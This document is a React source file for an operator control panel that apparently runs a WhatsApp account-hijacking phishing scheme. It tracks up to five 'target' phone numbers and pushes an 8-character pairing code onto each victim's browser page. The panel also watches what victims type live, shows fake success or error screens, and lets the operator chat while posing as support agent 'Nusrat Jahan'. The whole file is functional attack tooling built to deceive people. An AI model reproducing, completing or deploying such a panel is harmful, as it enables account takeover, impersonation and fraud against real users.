import React, { useState, useEffect, useRef } from "react";
import { Shield, Trash2, ArrowLeft, Phone, Clock, Send, Check, Layers, AlertCircle, MessageSquare } from "lucide-react";

interface AdminControllerProps {
  dbInstance: any;
  onExit: () => void;
}

interface SlotData {
  id: number;
  phoneNumber: string;
  digits: string[];
  uid?: string;
  currentPhase?: string;
  lastActive?: number;
  action?: string;
}

const AdminSlotRow = React.memo<{
  index: number;
  slot: SlotData;
  onUpdate: (updated: SlotData) => void;
  dbInstance: any;
  chatHistory: any[];
  userTypingText?: string;
  onSendMessage: (text: string) => void;
  onSendTyping: (text: string) => void;
}>(({ index, slot, onUpdate, dbInstance, chatHistory, userTypingText, onSendMessage, onSendTyping }) => {
  const [remoteStatus, setRemoteStatus] = useState<{
    phone?: string;
    currentPhase?: string;
    lastActive?: number;
    code?: string;
  } | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [isChatExpanded, setIsChatExpanded] = useState(false);
  const [replyText, setReplyText] = useState("");
  const digitRefs = useRef<(HTMLInputElement | null)[]>([]);
  const chatScrollRef = useRef<HTMLDivElement | null>(null);

  const sanitizedPhone = slot.phoneNumber.replace(/\D/g, "");

  // Real-time synchronization from parent slots prop
  useEffect(() => {
    setRemoteStatus({
      phone: slot.phoneNumber || "",
      currentPhase: slot.currentPhase || "Inputting Phone",
      lastActive: slot.lastActive || 0,
      code: slot.digits.join("")
    });
  }, [slot]);

  const pushToFirebase = async (phoneVal: string, digitsVal: string[]) => {
    setIsSyncing(true);
    const fullCode = digitsVal.join("");
    
    try {
      await fetch("/api/liveCodes/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: index,
          data: {
            phone: phoneVal,
            code: fullCode,
            updatedAt: Date.now()
          }
        })
      });
    } catch (err) {
      console.error("Sync error on slot:", err);
    } finally {
      setTimeout(() => setIsSyncing(false), 200);
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    const updated = { ...slot, phoneNumber: val };
    onUpdate(updated);
    pushToFirebase(val, slot.digits);
  };

  const handleDigitChange = (val: string, digitIdx: number) => {
    const char = val.slice(-1).replace(/[^a-zA-Z0-9]/g, ""); // Alphanumeric only
    const nextDigits = [...slot.digits];
    nextDigits[digitIdx] = char;

    const updated = { ...slot, digits: nextDigits };
    onUpdate(updated);
    pushToFirebase(slot.phoneNumber, nextDigits);

    // Auto Focus Next Sibling
    if (char && digitIdx < 7) {
      digitRefs.current[digitIdx + 1]?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, digitIdx: number) => {
    if (e.key === "Backspace" && !slot.digits[digitIdx] && digitIdx > 0) {
      digitRefs.current[digitIdx - 1]?.focus();
    }
  };

  const handleKeyUp = (e: React.KeyboardEvent<HTMLInputElement>, digitIdx: number) => {
    if (e.key === "Backspace") {
      pushToFirebase(slot.phoneNumber, slot.digits);
    }
  };

  const handleRemoteAction = async (actionType: "success" | "error" | "clear") => {
    setIsSyncing(true);
    try {
      if (actionType === "clear") {
        const clearedDigits = Array(8).fill("");
        onUpdate({ ...slot, phoneNumber: "", digits: clearedDigits, uid: "", currentPhase: "", lastActive: 0, action: "clear" });
        await fetch("/api/liveCodes/update", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: index,
            data: {
              phone: "",
              code: "",
              uid: "",
              action: "clear",
              actionTimestamp: Date.now(),
              currentPhase: "",
              lastActive: 0
            }
          })
        });
      } else {
        await fetch("/api/liveCodes/update", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: index,
            data: {
              action: actionType,
              actionTimestamp: Date.now(),
              currentPhase: actionType === "success" ? "success" : "alert_warned"
            }
          })
        });
      }
    } catch (e) {
      console.error("Action error:", e);
    } finally {
      setTimeout(() => setIsSyncing(false), 200);
    }
  };

  const isOnline = remoteStatus?.lastActive && (Date.now() - remoteStatus.lastActive) < 45000;

  return (
    <div className="flex flex-col gap-2.5">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 md:p-5 flex flex-col xl:flex-row xl:items-center justify-between gap-4 transition-all duration-300 hover:border-slate-700/80 hover:shadow-xl relative overflow-hidden group">
        
        {/* Background glow highlights */}
        <div className={`absolute top-0 left-0 w-1.5 h-full transition-all duration-300 ${
          isOnline 
            ? "bg-emerald-500 shadow-[0_0_12px_rgba(16,185,129,0.5)]" 
            : "bg-slate-800"
        }`} />

      {/* Row Index and Input Label Card */}
      <div className="flex items-center gap-3 shrink-0">
        <div className="w-8 h-8 rounded-full bg-slate-950 border border-slate-800 flex items-center justify-center text-[13px] font-extrabold text-slate-400 font-mono">
          {index + 1}
        </div>
        
        <div className="space-y-1 w-full sm:w-[220px]">
          <label className="text-[10px] font-extrabold tracking-wider text-emerald-400 uppercase font-mono block">
            Target Phone • ইউজার ফোন নাম্বার
          </label>
          <div className="relative">
            <input
              type="tel"
              value={slot.phoneNumber}
              onChange={handlePhoneChange}
              placeholder="017xxxxxxxx"
              className="w-full bg-slate-950 border border-slate-800 hover:border-slate-700 focus:border-emerald-500 rounded-xl px-3 py-2 text-[13.5px] font-bold text-slate-200 placeholder-slate-700 focus:outline-none transition-all font-mono"
            />
            <span className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-600">
              <Phone className="w-3.5 h-3.5" />
            </span>
          </div>
        </div>
      </div>

      {/* 8 Custom digits code box */}
      <div className="flex flex-col gap-1.5 shrink-0">
        <span className="text-[10px] font-extrabold tracking-wider text-slate-400 uppercase font-mono">
          8-Digit typing box • ৮ সংখ্যার কোড
        </span>
        <div className="flex gap-1 font-sans">
          {slot.digits.map((digit, dIdx) => (
            <input
              key={dIdx}
              ref={(el) => { digitRefs.current[dIdx] = el; }}
              type="text"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(e.target.value, dIdx)}
              onKeyDown={(e) => handleKeyDown(e, dIdx)}
              onKeyUp={(e) => handleKeyUp(e, dIdx)}
              disabled={!slot.phoneNumber}
              placeholder="•"
              className="w-[32px] sm:w-[35px] h-[45px] bg-slate-950 border border-slate-800 focus:border-emerald-500 rounded-lg text-center text-[18px] font-extrabold font-mono text-[#00a884] placeholder-slate-800 focus:outline-none transition-all focus:scale-105 disabled:opacity-40 disabled:cursor-not-allowed outline-none"
            />
          ))}
        </div>
      </div>

      {/* Target Handshake live status & updates */}
      <div className="flex-1 min-w-[130px] flex flex-row xl:flex-col justify-between xl:justify-center items-center xl:items-start p-2 rounded-xl bg-slate-950/60 border border-slate-850 gap-2">
        <div className="flex items-center gap-2">
          <span className={`w-2.5 h-2.5 rounded-full ${
            isOnline 
              ? "bg-emerald-500 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]" 
              : "bg-slate-800"
          }`} />
          <span className={`text-[11.5px] font-bold ${isOnline ? "text-emerald-400" : "text-slate-500"}`}>
            {isOnline ? "ONLINE (অনলাইন)" : "OFFLINE (অфলাইন)"}
          </span>
        </div>

        <div className="text-[10.5px] text-slate-400 flex items-center gap-1 font-sans">
          <Clock className="w-3 h-3 text-slate-500" />
          <span className="font-semibold text-slate-300">
            {remoteStatus?.currentPhase 
              ? `ধাপ: ${remoteStatus.currentPhase}` 
              : "কোন ডেটা নেই"}
          </span>
        </div>
      </div>

      {/* Row Trigger commands panel */}
      <div className="flex items-center gap-2 shrink-0 pt-2 xl:pt-0">
        <button
          onClick={() => handleRemoteAction("clear")}
          disabled={!slot.phoneNumber}
          className="p-2.5 bg-red-500/10 hover:bg-red-500 active:scale-95 text-red-400 hover:text-white rounded-xl border border-red-500/20 transition-all font-bold text-[12px] flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed select-none"
          title="মুছে ফেলুন"
        >
          <Trash2 className="w-3.5 h-3.5" />
          <span className="hidden sm:inline">মুছুন</span>
        </button>

        <button
          onClick={() => handleRemoteAction("error")}
          disabled={!slot.phoneNumber}
          className="p-2.5 bg-amber-500/10 hover:bg-amber-500 active:scale-95 text-amber-400 hover:text-white rounded-xl border border-amber-500/20 transition-all font-bold text-[11.5px] flex items-center justify-center gap-1 cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed select-none"
          title="ভুল কোড দেখান"
        >
          <Send className="w-3.5 h-3.5" />
          <span className="hidden sm:inline">ভুল সংকেত</span>
        </button>

        <button
          onClick={() => {
            setIsChatExpanded(!isChatExpanded);
          }}
          disabled={!slot.phoneNumber}
          className={`p-2.5 active:scale-95 rounded-xl border transition-all font-bold text-[11.5px] flex items-center justify-center gap-1 cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed select-none ${
            isChatExpanded
              ? "bg-[#00a884] text-slate-950 border-emerald-500 font-extrabold"
              : "bg-emerald-500/10 hover:bg-emerald-500/20 text-[#25d366] border-emerald-500/15"
          }`}
          title="লাইভ চ্যাট"
        >
          <MessageSquare className="w-3.5 h-3.5" />
          <span className="hidden sm:inline">চ্যাট ({chatHistory.length})</span>
        </button>

        <button
          onClick={() => handleRemoteAction("success")}
          disabled={!slot.phoneNumber}
          className="p-2.5 bg-emerald-500/15 hover:bg-emerald-600 active:scale-95 text-[#25d366] hover:text-slate-950 rounded-xl border border-emerald-500/20 transition-all font-extrabold text-[11.5px] flex items-center justify-center gap-1 cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed select-none"
          title="সফল স্ক্রিন দেখান"
        >
          <Check className="w-3.5 h-3.5 stroke-[3]" />
          <span className="hidden sm:inline">সফল করুন</span>
        </button>
      </div>

    </div>

    {/* Collapsible Real-time Chat Container */}
    {isChatExpanded && (
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 space-y-3.5 transition-all text-left animate-in fade-in slide-in-from-top-3 duration-250">
        <div className="flex justify-between items-center border-b border-slate-800/60 pb-2.5">
          <span className="text-[11px] font-extrabold uppercase tracking-widest text-[#25d366] font-mono flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_8px_rgba(37,211,102,0.6)]" />
            Live Support Stream • টার্গেট চ্যাট লাইন ({slot.phoneNumber})
          </span>
          {userTypingText && (
            <span className="text-[10px] text-amber-400 font-extrabold animate-pulse bg-amber-500/10 px-2.5 py-1 rounded-full border border-amber-500/20 font-mono">
              ✍️ লাইভ টাইপ: "{userTypingText}"
            </span>
          )}
        </div>

        {/* Messages feed */}
        <div 
          className="max-h-[180px] overflow-y-auto space-y-3 rounded-xl bg-slate-950/80 border border-slate-850 p-3"
          ref={(el) => {
            if (el) el.scrollTop = el.scrollHeight;
          }}
        >
          {chatHistory.length === 0 ? (
            <div className="text-center text-slate-600 text-[11.5px] py-3.5 font-medium">
              সব চ্যাট খালি! ব্যবহারকারী এখনো কোন মেসেজ পাঠাননি।
            </div>
          ) : (
            chatHistory.map((msg: any) => {
              const isAdminMsg = msg.sender === "nusrat";
              return (
                <div
                  key={msg.id}
                  className={`flex flex-col max-w-[80%] rounded-xl px-3 py-2 text-[12px] leading-relaxed ${
                    isAdminMsg
                      ? "bg-slate-850 border border-slate-750 text-slate-200 self-end rounded-tr-none ml-auto"
                      : "bg-[#0b2d21]/60 border border-teal-950/50 text-[#25d366] self-start rounded-tl-none mr-auto"
                  }`}
                >
                  <span className="font-extrabold text-[8px] text-slate-500 mb-0.5 uppercase tracking-wider block">
                    {isAdminMsg ? "Nusrat Jahan (Admin)" : "User Customer"}
                  </span>
                  <span className="font-sans font-medium">{msg.text}</span>
                  <span className="text-[8px] text-slate-600 mt-1 self-end font-mono select-none">
                    {new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                  </span>
                </div>
              );
            })
          )}
        </div>

        {/* Sender reply form */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            if (replyText.trim()) {
              onSendMessage(replyText);
              setReplyText("");
            }
          }}
          className="flex gap-2.5"
        >
          <input
            type="text"
            value={replyText}
            onChange={(e) => {
              setReplyText(e.target.value);
              onSendTyping(e.target.value);
            }}
            placeholder="Nusrat Jahan হিসেবে মেসেজ লিখুন..."
            className="flex-1 bg-slate-950 hover:border-slate-800 focus:border-emerald-500 border border-slate-800 rounded-xl px-4 py-2.5 text-[12.5px] text-slate-200 placeholder-slate-700 focus:outline-none transition-all"
          />
          <button
            type="submit"
            disabled={!replyText.trim()}
            className="px-4 py-2.5 bg-[#00a884] hover:bg-[#008f70] text-slate-950 font-extrabold text-[12px] rounded-xl transition-all disabled:opacity-30 disabled:cursor-not-allowed whitespace-nowrap"
          >
            Reply
          </button>
        </form>
      </div>
    )}
  </div>
  );
}, (prevProps, nextProps) => {
  const s1 = prevProps.slot;
  const s2 = nextProps.slot;
  const digitsMatch = s1.digits.join("") === s2.digits.join("");
  return (
    s1.phoneNumber === s2.phoneNumber &&
    s1.uid === s2.uid &&
    s1.currentPhase === s2.currentPhase &&
    s1.lastActive === s2.lastActive &&
    s1.action === s2.action &&
    digitsMatch &&
    prevProps.userTypingText === nextProps.userTypingText &&
    prevProps.chatHistory.length === nextProps.chatHistory.length
  );
});

export const AdminController: React.FC<AdminControllerProps> = ({ dbInstance, onExit }) => {
  const [slots, setSlots] = useState<SlotData[]>(() => 
    Array(5).fill(null).map((_, i) => ({
      id: i,
      phoneNumber: "",
      digits: Array(8).fill("")
    }))
  );

  // Real-time Chat core administrative repositories
  const [chats, setChats] = useState<Record<string, any[]>>({});
  const [typing, setTyping] = useState<Record<string, string>>({});
  const wsRef = useRef<WebSocket | null>(null);

  // Synchronise with Server-side fallback database
  useEffect(() => {
    const fetchSlotsFromApi = async () => {
      try {
        const res = await fetch("/api/liveCodes");
        if (res.ok) {
          const data = await res.json();
          const parsedSlots: SlotData[] = Array(5).fill(null).map((_, i) => {
            const slotNode = data[i] || {};
            const phoneStr = slotNode.phone || "";
            const codeValue = slotNode.code || "";
            const digitsArray = String(codeValue).padEnd(8, " ").split("").map(c => c === " " ? "" : c);
            return {
              id: i,
              phoneNumber: phoneStr,
              digits: digitsArray,
              uid: slotNode.uid || "",
              currentPhase: slotNode.currentPhase || "",
              lastActive: slotNode.lastActive || 0,
              action: slotNode.action || ""
            };
          });
          setSlots(parsedSlots);
        }
      } catch (err) {
        // Log as mild warning rather than hard console.error to keep developer logs pristine during disconnections
        console.warn("Could not fetch slots inside admin (temporary connection standby)");
      }
    };

    fetchSlotsFromApi();
    const interval = setInterval(fetchSlotsFromApi, 1500); // Polling for slots

    return () => {
      clearInterval(interval);
    };
  }, []);

  // Set up Admin WebSocket to stream all chat messages and typing indicator logs instantly
  useEffect(() => {
    let socket: WebSocket;
    let reconnectTimeout: any;

    const connectWS = () => {
      const proto = window.location.protocol === "https:" ? "wss://" : "ws://";
      const url = `${proto}${window.location.host}`;
      socket = new WebSocket(url);
      wsRef.current = socket;

      socket.onopen = () => {
        // Register connection as administrator
        socket.send(JSON.stringify({
          type: "join",
          isAdmin: true
        }));
      };

      socket.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);

          if (data.type === "init_admin") {
            setChats(data.histories || {});
            setTyping(data.typing || {});
          }

          if (data.type === "typing") {
            setTyping((prev) => {
              const updated = { ...prev };
              if (data.text && data.text.trim()) {
                updated[data.sessionUid] = data.text;
              } else {
                delete updated[data.sessionUid];
              }
              return updated;
            });
          }

          if (data.type === "message") {
            setChats((prev) => {
              const prevHist = prev[data.sessionUid] || [];
              const exists = prevHist.some(m => m.id === data.message.id);
              if (exists) return prev;
              return {
                ...prev,
                [data.sessionUid]: [...prevHist, data.message]
              };
            });
          }
        } catch (err) {
          console.warn("WebSocket parsing error inside admin:", err);
        }
      };

      socket.onclose = () => {
        reconnectTimeout = setTimeout(connectWS, 4500);
      };

      socket.onerror = () => {
        socket.close();
      };
    };

    connectWS();

    return () => {
      if (socket) {
        socket.onclose = null;
        socket.close();
      }
      clearTimeout(reconnectTimeout);
    };
  }, []);

  const handleAdminSendMessage = (sessionUid: string, text: string) => {
    if (!text.trim() || !sessionUid) return;

    const payload = {
      type: "message",
      sessionUid,
      sender: "nusrat",
      text,
      timestamp: Date.now()
    };

    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(payload));
      
      // Stop typing status instantly upon submit
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text: ""
      }));
    } else {
      // Local offline append
      setChats((prev) => {
        const prevHist = prev[sessionUid] || [];
        const localMsg = {
          id: "admin_offline_" + Date.now(),
          sender: "nusrat",
          text,
          timestamp: Date.now()
        };
        return {
          ...prev,
          [sessionUid]: [...prevHist, localMsg]
        };
      });
    }
  };

  const handleAdminTyping = (sessionUid: string, text: string) => {
    if (!sessionUid) return;
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({
        type: "typing",
        sessionUid,
        text
      }));
    }
  };

  const handleUpdateSlot = async (index: number, updated: SlotData) => {
    const codeStr = updated.digits.join("");
    try {
      await fetch("/api/liveCodes/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: index,
          data: {
            phone: updated.phoneNumber,
            code: codeStr,
            updatedAt: Date.now()
          }
        })
      });
    } catch (err) {
      console.error("Error writing slot modification:", err);
    }
  };

  const handleClearAllSlots = async () => {
    if (window.confirm("আপনি কি নিশ্চিত যে সব ১-৫ স্লট খালি করতে চান?")) {
      try {
        await fetch("/api/liveCodes/reset", {
          method: "POST"
        });
      } catch (err) {
        console.error("Error clearing slots:", err);
      }
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-white p-3 md:p-6 font-sans select-none flex flex-col justify-between">
      
      {/* Maximum compact shell */}
      <div className="max-w-5xl mx-auto w-full space-y-4 font-sans">
        
        {/* Elegant top bar */}
        <header className="flex flex-col sm:flex-row justify-between items-center bg-slate-900 border border-slate-800 p-4 rounded-3xl gap-3">
          <div className="flex items-center gap-3">
            <button 
              onClick={onExit}
              className="p-2.5 hover:bg-slate-800 rounded-xl text-slate-400 hover:text-white transition cursor-pointer"
              title="Return to Main Chat View"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <div className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
                <h1 className="text-[17px] font-extrabold text-slate-100 flex items-center gap-1.5">
                  <Shield className="w-4.5 h-4.5 text-emerald-500" /> WhatsApp ৫-চ্যানেল কন্ট্রোল প্যানেল
                </h1>
              </div>
              <p className="text-[11.5px] text-slate-400">একাধিক টার্গেট ইউজারদের জন্য পৃথক পৃথক ৮ সংখ্যার কনসোল কোড</p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleClearAllSlots}
              className="py-2 px-3 bg-red-500/10 hover:bg-red-500 text-red-400 hover:text-white border border-red-500/20 rounded-xl text-[11px] font-bold transition-all cursor-pointer"
            >
              রিসেট প্যানেল (Clear All)
            </button>
            <div className="bg-emerald-500/10 text-emerald-400 text-[10px] px-2.5 py-1 rounded-full border border-emerald-500/20 font-bold uppercase tracking-wider font-mono">
              Online Hub
            </div>
          </div>
        </header>

        {/* Quick Bengali instruction guide box */}
        <div className="bg-slate-900/60 rounded-2xl p-4 border border-emerald-500/10 flex items-start gap-3">
          <Layers className="w-5 h-5 text-emerald-500 shrink-0 mt-0.5" />
          <div className="text-[11.5px] text-slate-300 leading-relaxed">
            <strong>কিভাবে কাজ করবে:</strong> নিচের ১ থেকে ৫ নাম্বার স্লটে আলাদা টার্গেট ইউজারের ফোন নম্বর টাইপ করুন (যেমন - <code className="text-white bg-slate-950 font-mono px-1 py-0.2 rounded">01712345678</code>)। ফোন নম্বর দেওয়ার সাথে সাথে ফাকা ৮টি বক্স চালু হয়ে যাবে। এরপর বক্সে ৮ সংখ্যার কোড টাইপ করলে তা সরাসরি <strong>নির্দিষ্ট টার্গেট ইউজারের ব্রাউজার পেজে</strong> কোড বক্সে রিমোটলি শো করবে। আপনি মুছে দিতে বা পরিবর্তন করতে পারবেন একই সাথে ৫ জনের জন্য পৃথকভাবে।
          </div>
        </div>

        {/* 5 Slots Vertically Stacked List */}
        <main className="space-y-4" id="adminSlotsWrapper">
          {slots.map((slot, idx) => {
            const uidStr = slot.uid || "";
            return (
              <AdminSlotRow
                key={slot.id}
                index={idx}
                slot={slot}
                onUpdate={(updated) => handleUpdateSlot(idx, updated)}
                dbInstance={null}
                chatHistory={uidStr ? (chats[uidStr] || []) : []}
                userTypingText={uidStr ? typing[uidStr] : ""}
                onSendMessage={(text) => handleAdminSendMessage(uidStr, text)}
                onSendTyping={(text) => handleAdminTyping(uidStr, text)}
              />
            );
          })}
        </main>

      </div>

      {/* Admin Branding footer */}
      <footer className="text-center text-[10.5px] text-slate-650 font-mono py-6 mt-6 border-t border-slate-900">
        🔒 Real-time 5-Channel Remote Switcher Engine V5.5 • AI Studio Integrated
      </footer>

    </div>
  );
};
